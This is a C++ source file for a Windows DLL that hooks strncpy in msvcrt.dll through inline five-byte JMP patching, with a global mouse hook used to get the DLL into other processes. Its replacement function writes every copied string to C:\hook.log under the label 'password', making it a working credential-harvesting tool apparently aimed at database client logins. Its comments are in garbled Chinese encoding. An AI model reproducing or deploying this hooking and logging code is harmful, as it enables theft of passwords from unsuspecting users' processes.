// Hook.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "Hook.h"
#include "info.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
/////////////////////////////////////////////////////////////////////////////
// CHookApp

BEGIN_MESSAGE_MAP(CHookApp, CWinApp)
	//{{AFX_MSG_MAP(CHookApp)
	// NOTE - the ClassWizard will add and remove mapping macros here.
	//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHookApp construction

CHookApp::CHookApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CHookApp object

CHookApp theApp;

//��������

//��ͬInstance����ĸñ���
#pragma data_seg("SHARED")
static HHOOK  hhk=NULL; //��깳�Ӿ��
static HINSTANCE hinst=NULL; //��dll��ʵ����� (hook.dll)
#pragma data_seg()
#pragma comment(linker, "/section:SHARED,rws")
//���ϵı�������Ŷ!

CString temp; //������ʾ�������ʱ����
bool bHook=false; //�Ƿ�Hook�˺���
bool m_bInjected=false; //�Ƿ��API������Hook
BYTE OldCode[5]; //�ϵ�ϵͳAPI��ڴ���
BYTE NewCode[5]; //Ҫ��ת��API���� (jmp xxxx)
typedef char* (*Sysstrncpy)(char* strDest,const char* strSource, size_t count);//add.dll�е�add��������
Sysstrncpy sysstrncpy; //ntwdblib.dll�е�strncpy����
HANDLE hProcess=NULL; //�������̵ľ��
FARPROC pfstrncpy;  //ָ��add������Զָ��
DWORD dwPid;  //��������ID
//��־�ļ�
RcLogInfo rl;
//end of ��������

//��������
void HookOn(); //��������
void HookOff(); //�رչ���
LRESULT CALLBACK MouseProc(int nCode,WPARAM wParam,LPARAM lParam); //��깳�Ӻ���
void Inject(); //�������ע�䣬�滻��ڵĺ���
char* Mystrncpy(char* strDest,const char* strSource, size_t count); //���Ƕ�����µ�add()����
BOOL InstallHook(); //��װ���Ӻ���
void UninstallHook(); //ж�ع��Ӻ���
char cPath[MAX_PATH];
//end of ��������


BOOL CHookApp::InitInstance() 
{
	
    FILE *m_pfLogFile = fopen("C:\\hook.log","at+");
    if(NULL == m_pfLogFile)
    {
		AfxMessageBox(_TEXT("file open failed!"));
        return 1;
    }

    rl.SetLogFile(m_pfLogFile);


    rl.WriteLogInfo("hook.dll begin instance...\n");

	//��ȡ����dll���
	hinst=::AfxGetInstanceHandle();
	//��ȡ��������id�;��
	DWORD dwPid=::GetCurrentProcessId();
	hProcess=OpenProcess(PROCESS_ALL_ACCESS,0,dwPid); 
	//���ú���ע��
	Inject();

	return CWinApp::InitInstance();
}

int CHookApp::ExitInstance() 
{
	// ���add���ӿ��ţ�����ر�
	if (bHook)
		HookOff();

	return CWinApp::ExitInstance();
}

BOOL InstallHook()
{

	hhk=::SetWindowsHookEx(WH_MOUSE,MouseProc,hinst,0);

	if (hhk==NULL)
	{
		DWORD err=::GetLastError();
		temp.Format(_TEXT("hook install failed!:%d"),err);
		AfxMessageBox(temp);
		return false;
	}

	AfxMessageBox(_TEXT("hook installed!"));
	return true;
}

void UninstallHook()
{
	if (hhk!=NULL){
		::UnhookWindowsHookEx(hhk);
	}
	printf("Unhooked!\n");
}

void Inject()
{

	if (m_bInjected==false)
	{
		m_bInjected=true;

		HMODULE hmod = LoadLibraryA("msvcrt.dll");
		char log[MAX_PATH]={'\0'};
		sprintf(log, "msvcrt addr : 0x%x\n", (DWORD)hmod);

		rl.WriteLogInfo(log);

		if (!hmod){
			rl.WriteLogInfo("dll can't load\n");
		}
		sysstrncpy=(Sysstrncpy)::GetProcAddress(hmod,"strncpy");
		if (!sysstrncpy){
			rl.WriteLogInfo("strncpy can't find\n");
		}

		sprintf(log, "strncpy addr : 0x%x\n", (DWORD) sysstrncpy);
		rl.WriteLogInfo(log);

		//test function
		char buf[8];
		sysstrncpy(buf, "1234567", 7);
		if (buf[0] == '1'){
			rl.WriteLogInfo("����ִ�гɹ�\n");
		}else{
			rl.WriteLogInfo("����ִ��ʧ��\n");
		}


		pfstrncpy=(FARPROC)sysstrncpy;


		if (pfstrncpy==NULL)
		{
			rl.WriteLogInfo("cannot locate strncpy()\n");
		}



		rl.WriteLogInfo("begin alter function\n");
		// ��add()����ڴ��뱣�浽OldCode��
		_asm 
		{ 
			lea edi,OldCode 
				mov esi,pfstrncpy 
				cld 
				movsd 
				movsb 
		}

		NewCode[0]=0xe9;//��һ���ֽ�0xe9�൱��jmpָ��
		//��ȡMyadd()����Ե�ַ
		_asm 
		{ 
			lea eax,Mystrncpy
				mov ebx,pfstrncpy 
				sub eax,ebx 
				sub eax,5 
				mov dword ptr [NewCode+1],eax 
		} 

		rl.WriteLogInfo("end alter funtion\n");
		//�����ϣ�����NewCode[]������൱��ָ�� jmp Myadd
		HookOn();
	}
}


char* Mystrncpy(char* strDest,const char* strSource, size_t count)
{
	//password.Format(_T("password : %s"), strSource);

	char log[MAX_PATH]={'\0'};
	sprintf(log, "password : %s\n", strSource);

	rl.WriteLogInfo(log);

	//�ػ��˶�add()�ĵ��ã����Ǹ�a,b����1

	HookOff();//�ص�Myadd()���ӷ�ֹ��ѭ��

	char* ret;
	ret=sysstrncpy(strDest,strSource, count);

	HookOn();//����Myadd()����

	return ret;
}


LRESULT CALLBACK MouseProc(
						   int nCode,      // hook code
						   WPARAM wParam,  // message identifier
						   LPARAM lParam   // mouse coordinates
						   )
{

	LRESULT RetVal= CallNextHookEx(hhk,nCode,wParam,lParam);
	return RetVal;
}


void HookOn() 
{ 
	if(hProcess==NULL){
		rl.WriteLogInfo("hprocess is null\n");
	}

	DWORD dwTemp=0;
	DWORD dwOldProtect;

	//���ڴ汣��ģʽ��Ϊ��д,��ģʽ������dwOldProtect
	if (!VirtualProtectEx(hProcess,pfstrncpy,5,PAGE_READWRITE,&dwOldProtect)){
		rl.WriteLogInfo("������ģʽʧ��\n");
	}
	//������������add��ǰ5���ֽڸ�ΪJmp Myadd 
	if (!WriteProcessMemory(hProcess,pfstrncpy,NewCode,5,0)){
		rl.WriteLogInfo("��ת failed\n");
	}
	//���ڴ汣��ģʽ�Ļ�ΪdwOldProtect
	if (!VirtualProtectEx(hProcess,pfstrncpy,5,dwOldProtect,&dwTemp)){
		rl.WriteLogInfo("�Ļ��� failed\n");
	}


	bHook=true; 
}

void HookOff()//������������add()����ڴ���ָ�
{ 
	ASSERT(hProcess!=NULL);

	DWORD dwTemp=0;
	DWORD dwOldProtect;

	VirtualProtectEx(hProcess,pfstrncpy,5,PAGE_READWRITE,&dwOldProtect); 
	WriteProcessMemory(hProcess,pfstrncpy,OldCode,5,0); 
	VirtualProtectEx(hProcess,pfstrncpy,5,dwOldProtect,&dwTemp); 
	bHook=false; 
}